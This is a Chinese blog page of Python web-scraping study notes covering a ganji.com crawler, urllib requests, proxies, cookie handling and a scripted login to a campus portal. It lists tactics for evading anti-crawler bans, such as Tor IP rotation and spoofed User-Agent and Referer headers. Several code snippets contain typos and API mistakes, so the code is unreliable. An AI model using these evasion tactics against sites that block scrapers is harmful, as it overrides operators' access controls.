<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#channel_extracing.py</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span>  BeautifulSoup</div><div class="line"></div><div class="line">start_url = <span class="string">'http://bj.ganji.com/wu'</span></div><div class="line">url_host = <span class="string">'http://bj.ganji.com'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_index_url</span><span class="params">(url)</span>:</span></div><div class="line">    wb_data = requests.get(url)</div><div class="line">    soup = BeautifulSoup(wb_data.text, <span class="string">'lxml'</span>)</div><div class="line">    links = soup.select(<span class="string">'.fenlei &gt; dt &gt; a'</span>)</div><div class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> links:</div><div class="line">        page_url = url_host + link.get(<span class="string">'href'</span>)</div><div class="line">        print(page_url)</div><div class="line"></div><div class="line"><span class="comment">#get_index_url(start_url)</span></div><div class="line"></div><div class="line">channel_list = <span class="string">'''</span></div><div class="line">http://bj.ganji.com/jiaju/</div><div class="line">http://bj.ganji.com/rirongbaihuo/</div><div class="line">http://bj.ganji.com/shouji/</div><div class="line">http://bj.ganji.com/shoujihaoma/</div><div class="line">http://bj.ganji.com/bangong/</div><div class="line">http://bj.ganji.com/nongyongpin/</div><div class="line">http://bj.ganji.com/jiadian/</div><div class="line">http://bj.ganji.com/ershoubijibendiannao/</div><div class="line">http://bj.ganji.com/ruanjiantushu/</div><div class="line">http://bj.ganji.com/yingyouyunfu/</div><div class="line">http://bj.ganji.com/diannao/</div><div class="line">http://bj.ganji.com/xianzhilipin/</div><div class="line">http://bj.ganji.com/fushixiaobaxuemao/</div><div class="line">http://bj.ganji.com/meironghuazhuang/</div><div class="line">http://bj.ganji.com/shuma/</div><div class="line">http://bj.ganji.com/laonianyongpin/</div><div class="line">http://bj.ganji.com/xuniwupin/</div><div class="line">http://bj.ganji.com/qitawupin/</div><div class="line">http://bj.ganji.com/ershoufree/</div><div class="line">http://bj.ganji.com/wupinjiaohuan/</div><div class="line">'''</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#main.py</span></div><div class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</div><div class="line"><span class="keyword">from</span> channel_extracing <span class="keyword">import</span> channel_list</div><div class="line"><span class="keyword">from</span> page_parsing <span class="keyword">import</span> get_item_info_from,get_links_from,url_list,item_info</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_links</span><span class="params">(channel)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</div><div class="line">        get_links_from(channel, i)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pool = Pool()</div><div class="line">    pool.map(get_all_links, channel_list.split())</div><div class="line">    pool.close()</div><div class="line">    pool.join()</div></pre></td></tr></table></figure>
<h2 id="25-更新数据库"><a href="#25-更新数据库" class="headerlink" title="25.更新数据库"></a>25.更新数据库</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">db.collection.update()</div><div class="line"><span class="comment">#update函数的用法,一般传入两个参数</span></div><div class="line">update(&#123;id:<span class="number">1</span>&#125;,&#123;$set:&#123;name:<span class="number">2</span>&#125;&#125;)</div></pre></td></tr></table></figure>
<h2 id="26-突破爬虫封禁的几种方法参考"><a href="#26-突破爬虫封禁的几种方法参考" class="headerlink" title="26.突破爬虫封禁的几种方法参考"></a>26.突破爬虫封禁的几种方法<a href="http://bigsec.com/bigsec-news/wechat-2016-web-crawler?ref=bigsec-news1" target="_blank" rel="external">参考</a></h2><p>1.构造合理的HTTP头部请求</p>
<p>2.学会正确的设置cookie</p>
<p>3.正确的时间访问路径（不能访问过快）</p>
<p>4.隐含输入字段值（honey pot）</p>
<p>5.使用可变的远程ip（Tor代理服务器，防止ip被ban）</p>
<p>6.动态页面模拟人为操作（selenium+phantomJS框架）</p>
]]></content>
      
        <categories>
            
            <category> 爬虫 MongoDB charts </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[网络爬虫]]></title>
      <url>/2017/05/12/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/</url>
      <content type="html"><![CDATA[<p>学习笔记<br><a id="more"></a></p>
<h1 id="网络爬虫"><a href="#网络爬虫" class="headerlink" title="网络爬虫"></a>网络爬虫</h1><p>什么是爬虫？</p>
<p>网络爬虫（又被称为网页蜘蛛，网络机器人，在FOAF社区中间，更经常的称为网页追逐者），是一种按照一定的规则，自动的抓取万维网信息的程序或者脚本。<br>简单的来说，爬虫就是把别人网站的信息弄到自己的电脑上，再做一些过滤，筛选，归纳，整理，排序等等，如果数据量足够大，算法足够好，能给别人提供优质的检索服务，就可以做成类似google或baidu</p>
<p>为什么选择python写爬虫？</p>
<p>1）抓取网页本身的接口<br>相比与其他静态编程语言，如java，c#，C++，python抓取网页文档的接口更简洁；相比其他动态脚本语言，如perl，shell，python的urllib2包提供了较为完整的访问网页文档的API。（当然ruby也是很好的选择）<br>此外，抓取网页有时候需要模拟浏览器的行为，很多网站对于生硬的爬虫抓取都是封杀的。这是我们需要模拟user agent的行为构造合适的请求，譬如模拟用户登陆、模拟session/cookie的存储和设置。在python里都有非常优秀的第三方包帮你搞定，如Requests，mechanize等等。</p>
<p>2）网页抓取后的处理<br>抓取的网页通常需要处理，比如过滤html标签，提取文本等。python的beautifulsoap提供了简洁的文档处理功能，能用极短的代码完成大部分文档的处理。</p>
<p>其实以上功能很多语言和工具都能做，但是用python能够干得最快，最干净。</p>
<h2 id="1-urlopen"><a href="#1-urlopen" class="headerlink" title="1.urlopen:"></a>1.urlopen:</h2><p>打开一个url方法，返回一个文件对象，然后就可以进行类似文件对象的操作。模块：urllib</p>
<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/AE9908A0-44A5-4B78-8557-360650F1CFFF.png" alt="" title="" class="">
                <p></p>
            </figure>
<h2 id="2-urlretrieve"><a href="#2-urlretrieve" class="headerlink" title="2.urlretrieve():"></a>2.urlretrieve():</h2><p>urlretrieve方法将url定位到的html文件下载到你的本地硬盘当中,模块：utllib,当没有指定路径的时候可以放到临时路径下面</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib</div><div class="line">a = urllib.urlretrieve(<span class="string">"xxx"</span>,filename = <span class="string">"/home/xx/xx/xx.xx"</span>)</div><div class="line"><span class="comment">#将a保存在本地硬盘中，可用的方法和urlopen相同,可以选择保存的路径</span></div></pre></td></tr></table></figure>
<h2 id="3-使用正则获取图片并保存在本地"><a href="#3-使用正则获取图片并保存在本地" class="headerlink" title="3.使用正则获取图片并保存在本地"></a>3.使用正则获取图片并保存在本地</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line">imgList = re.findall(<span class="string">r'src="(.*?\.(jpg|png))"'</span>,html)</div><div class="line">x = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> imgurl <span class="keyword">in</span> imgList:</div><div class="line">    print(<span class="string">'正在下载%s'</span>%imgurl[<span class="number">0</span>])</div><div class="line">    urllib.urlretrieve(imgurl[<span class="number">0</span>],<span class="string">'./downloads/%d.jpg'</span>%x)</div><div class="line">    x += <span class="number">1</span></div></pre></td></tr></table></figure>
<h2 id="4-urlencode-GET和POST方法"><a href="#4-urlencode-GET和POST方法" class="headerlink" title="4.urlencode,GET和POST方法"></a>4.urlencode,GET和POST方法</h2><p>最重要的区别是GET方式是直接以链接形式访问，链接中包含了所有的参数，当然如果包含了密码的话是一种不安全的选择，不过你可以直观地看到自己提交了什么内容。POST则不会在网址上显示所有的参数，不过如果你想直接查看提交了什么就不太方便了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"> </div><div class="line">values = &#123;&#125;</div><div class="line">values[<span class="string">'username'</span>] = <span class="string">"1016903103@qq.com"</span></div><div class="line">values[<span class="string">'password'</span>] = <span class="string">"XXXX"</span></div><div class="line">data = urllib.urlencode(values) </div><div class="line">url = <span class="string">"http://passport.csdn.net/account/login?from=http://my.csdn.net/my/mycsdn"</span></div><div class="line">request = urllib2.Request(url,data)</div><div class="line">response = urllib2.urlopen(request)</div><div class="line"><span class="keyword">print</span> response.read()</div><div class="line"><span class="comment">#POST方法，构建request时传入两个参数，url和data</span></div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line">values=&#123;&#125;</div><div class="line">values[<span class="string">'username'</span>] = <span class="string">"1016903103@qq.com"</span></div><div class="line">values[<span class="string">'password'</span>]=<span class="string">"XXXX"</span></div><div class="line">data = urllib.urlencode(values) </div><div class="line">url = <span class="string">"http://passport.csdn.net/account/login"</span></div><div class="line">geturl = url + <span class="string">"?"</span>+data</div><div class="line">request = urllib2.Request(geturl)</div><div class="line">response = urllib2.urlopen(request)</div><div class="line"><span class="keyword">print</span> response.read()</div><div class="line"><span class="comment">#GET方法，直接把参数写到网址上面，直接构建一个带参数的URL出来即可。</span></div></pre></td></tr></table></figure>
<h2 id="5-urllib2和伪造请求头部"><a href="#5-urllib2和伪造请求头部" class="headerlink" title="5.urllib2和伪造请求头部"></a>5.urllib2和伪造请求头部</h2><p>目的：是服务器分不清你是爬虫还是浏览器</p>
<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/37300744-19C5-4DD5-8D90-606A58200F0A.png" alt="" title="" class="">
                <p></p>
            </figure>
<p>设置Headers:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">url = <span class="string">'http://www.server.com/login'</span></div><div class="line">user_agent = <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4)'</span></div><div class="line">values = &#123;<span class="string">'username'</span> : <span class="string">'pzp'</span>, <span class="string">'password'</span> : <span class="string">'ascndksv'</span>&#125;</div><div class="line">headers = &#123;<span class="string">'User-Agent'</span> : user_agent&#125;</div><div class="line">data = urllib.urlencode(value)</div><div class="line">request = urllib.Request(url, data, headers)</div><div class="line">response = urllib.urlopen(request)</div><div class="line">page = response.read()</div><div class="line"><span class="comment">#服务器会识别headers中的referer是不是它自己，如果不是，有的服务器不会响应，所以我们还可以在headers中加入referer,这样就可以应付防盗链了</span></div><div class="line">headers = &#123;<span class="string">'User-Agent'</span> : user_agent, <span class="string">'Referer'</span> : <span class="string">'xxxxxx'</span>&#125;</div></pre></td></tr></table></figure>
<p>关于headers的其他属性：</p>
<blockquote>
<p>User-Agent : 有些服务器或 Proxy 会通过该值来判断是否是浏览器发出的请求</p>
<p>Content-Type : 在使用 REST 接口时，服务器会检查该值，用来确定 HTTP Body 中的内容该怎样解析。</p>
<p>application/xml ： 在 XML RPC，如 RESTful/SOAP 调用时使用</p>
<p>application/json ： 在 JSON RPC 调用时使用</p>
<p>application/x-www-form-urlencoded ： 浏览器提交 Web 表单时使用</p>
<p>在使用服务器提供的 RESTful 或 SOAP 服务时， Content-Type 设置错误会导致服务器拒绝服务</p>
</blockquote>
<h2 id="6-BeautifulSoup参考文章"><a href="#6-BeautifulSoup参考文章" class="headerlink" title="6.BeautifulSoup参考文章"></a>6.BeautifulSoup<a href="http://www.cnblogs.com/yupeng/p/3362031.html" target="_blank" rel="external">参考文章</a></h2><p>Beautiful Soup 是用Python写的一个HTML/XML的解析器，它可以很好的处理不规范标记并生成剖析树(parse tree)。 它提供简单又常用的导航（navigating），搜索以及修改剖析树的操作。它可以大大节省你的编程时间。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">html = urllib2.urlopen(<span class="string">"xxxxx"</span>)</div><div class="line">html = html.read()</div><div class="line">soup = BeautifulSoup(html)</div><div class="line"><span class="comment">#下面是几个常用的功能</span></div><div class="line">soup.标签名  <span class="comment">#只会显示第一个</span></div><div class="line">soup.select(<span class="string">'标签名'</span>)</div><div class="line">soup.select(<span class="string">'.类名'</span>)</div><div class="line">soup.select(<span class="string">'#id名'</span>)</div><div class="line"><span class="comment">#可以通过标签名，类名，id名来寻找，可以找出所有的</span></div><div class="line">soup.select(<span class="string">'标签名 id'</span>)  <span class="comment">#组合查找</span></div><div class="line">soup.select(<span class="string">'head &gt; title'</span>) <span class="comment">#子标签查找</span></div><div class="line">soup.select(<span class="string">'a[class="sister"]'</span>)  <span class="comment">#属性查找</span></div><div class="line">soup.标签名.string   <span class="comment">#获取文字</span></div><div class="line">soup.标签名.attrs    <span class="comment">#获取属性</span></div><div class="line"><span class="comment">#通过遍历树来寻找</span></div><div class="line">soup.find_all(<span class="string">'name, attrs, recursive, text, limit, **kwargs'</span>)</div><div class="line"><span class="comment">#get_text</span></div><div class="line">soup.get_text()<span class="comment">#获取文字信息，类似于string，但是string只能对一个对象使用</span></div><div class="line">soup.stripped_string<span class="comment">#类似于get_text（）方法，但是会获取所有子标签的文字信息</span></div></pre></td></tr></table></figure></p>
<h2 id="7-使用select不断筛选-取得属性"><a href="#7-使用select不断筛选-取得属性" class="headerlink" title="7.使用select不断筛选,取得属性"></a>7.使用select不断筛选,取得属性</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#之前的过程省略,此时yy是一个列表，不能对他进行筛选操作</span></div><div class="line">yy = soup select(<span class="string">'div[id=xxx]'</span>)</div><div class="line"><span class="comment">#此时将列表又转换成了对象，可以继续操作了</span></div><div class="line">zz = yy[<span class="number">0</span>]</div><div class="line"><span class="comment">#指向性的提取对象中的属性</span></div><div class="line">zz[<span class="string">'href'</span>]</div><div class="line"><span class="comment">#将对象转换成列表</span></div><div class="line">list(xxx)</div></pre></td></tr></table></figure>
<h2 id="8-urlopen的分析"><a href="#8-urlopen的分析" class="headerlink" title="8.urlopen的分析"></a>8.urlopen的分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">urlopen(url, data, timeout)</div><div class="line"><span class="comment">#第一个参数url即为URL，第二个参数data是访问URL时要传送的数据，第三个timeout是设置超时时间。</span></div><div class="line"></div><div class="line"><span class="comment">#第二三个参数是可以不传送的，data默认为空None，timeout默认为 socket._GLOBAL_DEFAULT_TIMEOUT</span></div><div class="line"></div><div class="line"><span class="comment">#第一个参数URL是必须要传送的</span></div></pre></td></tr></table></figure>
<h2 id="9-构造Request"><a href="#9-构造Request" class="headerlink" title="9.构造Request"></a>9.构造Request</h2><p>其实上面的urlopen参数可以传入一个request请求,它其实就是一个Request类的实例，构造时需要传入Url,Data等等的内容。因为在构建请求时还需要加入好多内容，通过构建一个request，服务器响应请求得到应答，这样显得逻辑上清晰明确。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"> </div><div class="line">request = urllib2.Request(<span class="string">"http://www.baidu.com"</span>)</div><div class="line">response = urllib2.urlopen(request)</div><div class="line"><span class="keyword">print</span> response.read()</div></pre></td></tr></table></figure>
<h2 id="10-Proxy（代理）的设置"><a href="#10-Proxy（代理）的设置" class="headerlink" title="10.Proxy（代理）的设置"></a>10.Proxy（代理）的设置</h2><p>urllib2 默认会使用环境变量 http_proxy 来设置 HTTP Proxy。假如一个网站它会检测某一段时间某个IP 的访问次数，如果访问次数过多，它会禁止你的访问。所以你可以设置一些代理服务器来帮助你做工作，每隔一段时间换一个代理，就不知道到底是谁了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">enable_proxy = <span class="keyword">True</span></div><div class="line">proxy_handler = urllib2.ProxyHandler(&#123;<span class="string">"http"</span> : <span class="string">'http://some-proxy.com:8080'</span>&#125;)</div><div class="line">null_proxy_handler = urllib2.ProxyHandler(&#123;&#125;)</div><div class="line"><span class="keyword">if</span> enable_proxy:</div><div class="line">    opener = urllib2.build_opener(proxy_handler)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    opener = urllib2.build_opener(null_proxy_handler)</div><div class="line">urllib2.install_opener(opener)</div></pre></td></tr></table></figure>
<h2 id="11-Timeout设置"><a href="#11-Timeout设置" class="headerlink" title="11.Timeout设置"></a>11.Timeout设置</h2><p>可以设置等待多久超时，为了解决一些网站实在响应过慢而造成的影响。如果第二个参数data为空那么要特别指定是timeout是多少，写明形参，如果data已经传入，则不必声明。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">response = urllib2.urlopen(<span class="string">'http://www.baidu.com'</span>, data, <span class="number">10</span>)</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">response = urllib2.urlopen(<span class="string">'http://www.baidu.com'</span>, timeout=<span class="number">10</span>)</div></pre></td></tr></table></figure>
<h2 id="12-PUT和DELETE方法"><a href="#12-PUT和DELETE方法" class="headerlink" title="12.PUT和DELETE方法"></a>12.PUT和DELETE方法</h2><p>PUT：这个方法比较少见。HTML表单也不支持这个。本质上来讲， PUT和POST极为相似，都是向服务器发送数据，但它们之间有一个重要区别，PUT通常指定了资源的存放位置，而POST则没有，POST的数据存放位置由服务器自己决定DELETE：删除某一个资源。基本上这个也很少见，不过还是有一些地方比如amazon的S3云服务里面就用的这个方法来删除资源。</p>
<h2 id="13-URLError"><a href="#13-URLError" class="headerlink" title="13.URLError"></a>13.URLError</h2><p>产生原因：</p>
<ul>
<li>网络无连接，即本机无法上网</li>
<li>连接不到特定的服务器</li>
<li>服务器不存在</li>
</ul>
<p>在代码中可以通过捕获异常来判断原因：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line">requset = urllib2.Request(<span class="string">'http://www.xxxxx.com'</span>)</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    urllib2.urlopen(request)</div><div class="line"><span class="keyword">except</span> urllib2.URLError, e:</div><div class="line">    <span class="keyword">print</span> e.reason</div><div class="line"><span class="comment">#如果访问了一个不存在的网址，那么运行的结果是：[Errno 11004] getaddrinfo failed</span></div></pre></td></tr></table></figure>
<p>HTTPError,是URLError的子类，所以也可以将父类捕获异常写在子类的后面</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line">req = urllib2.Request(<span class="string">'http://blog.csdn.net/cqcre'</span>)</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    urllib2.urlopen(req)</div><div class="line"><span class="keyword">except</span> urllib2.HTTPError, e:</div><div class="line">    <span class="keyword">print</span> e.code</div><div class="line"><span class="keyword">except</span> urllib2.URLError, e:</div><div class="line">    <span class="keyword">print</span> e.reason</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    <span class="keyword">print</span> (<span class="string">"OK"</span>)</div><div class="line"><span class="comment">#样例检错：403</span></div></pre></td></tr></table></figure>
<h2 id="14-Opener概念"><a href="#14-Opener概念" class="headerlink" title="14.Opener概念"></a>14.Opener概念</h2><blockquote>
<p>Cookie，指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）比如说有些网站需要登录后才能访问某个页面，在登录之前，你想抓取某个页面内容是不允许的。那么我们可以利用Urllib2库保存我们登录的Cookie，然后再抓取其他页面就达到目的了。</p>
<p>当你获取一个URL你使用一个opener(一个urllib2.OpenerDirector的实例)。在前面，我们都是使用的默认的opener，也就是urlopen。它是一个特殊的opener，可以理解成opener的一个特殊实例，传入的参数仅仅是url，data，timeout。</p>
<p>如果我们需要用到Cookie，只用这个opener是不能达到目的的，所以我们需要创建更一般的opener来实现对Cookie的设置。</p>
</blockquote>
<h2 id="15-Cookielib"><a href="#15-Cookielib" class="headerlink" title="15.Cookielib"></a>15.Cookielib</h2><p>该模块主要的对象有CookieJar、FileCookieJar、MozillaCookieJar、LWPCookieJar。</p>
<p>1.获取Cookie保存到变量</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> cookielib</div><div class="line"><span class="comment">#声明一个CookieJar对象实例来保存cookie</span></div><div class="line">cookie = cookielib.CookieJar()</div><div class="line"><span class="comment">#利用urllib2库的HTTPCookieProcessor对象来创建cookie处理器</span></div><div class="line">handler=urllib2.HTTPCookieProcessor(cookie)</div><div class="line"><span class="comment">#通过handler来构建opener</span></div><div class="line">opener = urllib2.build_opener(handler)</div><div class="line"><span class="comment">#此处的open方法同urllib2的urlopen方法，也可以传入request</span></div><div class="line">response = opener.open(<span class="string">'http://www.baidu.com'</span>)</div><div class="line"><span class="keyword">for</span> item <span class="keyword">in</span> cookie:</div><div class="line">    <span class="keyword">print</span> <span class="string">'Name = '</span>+item.name</div><div class="line">    <span class="keyword">print</span> <span class="string">'Value = '</span>+item.value</div></pre></td></tr></table></figure>
<p>2.保存Cookie到文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> cookielib</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line"><span class="comment">#设置保存cookie的文件，同级目录下的cookie.txt</span></div><div class="line">filename = <span class="string">'cookie.txt'</span></div><div class="line"><span class="comment">#声明一个MozillaCookieJar对象实例来保存cookie，之后写入文件</span></div><div class="line">cookie = cookielib.MozillaCookieJar(filename)</div><div class="line"><span class="comment">#利用urllib2库的HTTPCookieProcessor对象来创建cookie处理器</span></div><div class="line">handler = urllib2.HTTPCookieProcessor(cookie)</div><div class="line"><span class="comment">#通过handler来构建opener</span></div><div class="line">opener = urllib2.build_opener(handler)</div><div class="line"><span class="comment">#创建一个请求，原理同urllib2的urlopen</span></div><div class="line">response = opener.open(<span class="string">"http://www.baidu.com"</span>)</div><div class="line"><span class="comment">#保存cookie到文件</span></div><div class="line">cookie.save(ignore_discard=<span class="keyword">True</span>, ignore_expires=<span class="keyword">True</span>)</div><div class="line"><span class="comment">#ignore_discard的意思是即使cookies将被丢弃也将它保存下来</span></div><div class="line"><span class="comment">#ignore_expires的意思是如果该文件中的cookie已经存在，则覆盖原文件写入</span></div></pre></td></tr></table></figure>
<p>3.从文件中获取Cookie 值并访问</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> cookielib</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line"><span class="comment">#创造一个MozillaCookieJar实例对象</span></div><div class="line">cookie = cookielib.MozillaCookieJar()</div><div class="line"><span class="comment">#从文件中读入值到实例对象</span></div><div class="line">cookie.load(<span class="string">'cookie.txt'</span>, ignore_disgard = <span class="keyword">True</span>, ignore_expires = <span class="keyword">True</span>)</div><div class="line"><span class="comment">#创造请求的request</span></div><div class="line">request = urllib2.Request(<span class="string">"http://www.baidu.com"</span>)</div><div class="line"><span class="comment">#创建一个opener</span></div><div class="line">opener = urllib2.bulid_opener(urllib2.HTTPCookieProcessor(cookie))</div><div class="line">reponse = opener.open(request)</div><div class="line"><span class="keyword">print</span> reponse.read()</div></pre></td></tr></table></figure>
<p>4.利用cookie模拟网站的登录</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#示例。。登录校园网</span></div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">import</span> http.cookiejar</div><div class="line"></div><div class="line">filename = <span class="string">'cookie.txt'</span></div><div class="line"></div><div class="line">cookie = http.cookiejar.MozillaCookieJar(filename)</div><div class="line"></div><div class="line">opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))</div><div class="line"></div><div class="line">postdata = urllib.parse.urlencode(&#123;</div><div class="line">        <span class="string">'text'</span> : <span class="string">'2016xxxxxxxx'</span>,</div><div class="line">        <span class="string">'password'</span>   : <span class="string">'xxxxxxxxxxx'</span></div><div class="line">&#125;)</div><div class="line"></div><div class="line">loginurl = <span class="string">'http://ids.scuec.edu.cn/amserver/UI/Login?goto=http://eol.scuec.edu.cn/meol/homepage/common/sso_login.jsp'</span></div><div class="line"></div><div class="line">result = opener.open(loginurl, postdata.encode(<span class="string">'utf-8'</span>))</div><div class="line"></div><div class="line">cookie.save(ignore_discard=<span class="keyword">True</span>,ignore_expires=<span class="keyword">True</span>)</div><div class="line"></div><div class="line">gradeurl = <span class="string">'http://eol.scuec.edu.cn/meol/jpk/course/layout/newpage/index.jsp?courseId=16574'</span></div><div 